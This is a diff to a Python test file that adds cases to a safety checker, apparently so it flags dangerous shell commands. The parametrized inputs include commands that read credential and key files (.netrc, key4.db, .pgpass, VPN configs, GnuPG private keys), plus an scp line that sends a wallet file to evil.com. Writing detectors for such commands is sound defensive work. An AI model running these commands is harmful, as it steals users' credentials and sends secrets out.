@@ -467,6 +467,11 @@ class TestSafetyChecks:
             ("secret-tool store --label=x a b\n", "SEC-343"),
             ("gcore -k 1234\n", "SEC-344"),
             ("scp wallet.dat user@evil.com:\n", "SEC-345"),
+            ("cat ~/.netrc\n", "SEC-346"),
+            ("cp key4.db /tmp/\n", "SEC-347"),
+            ("cat client.ovpn\n", "SEC-348"),
+            ("cat .pgpass\n", "SEC-349"),
+            ("cat ~/.gnupg/private-keys-v1.d/key\n", "SEC-350"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
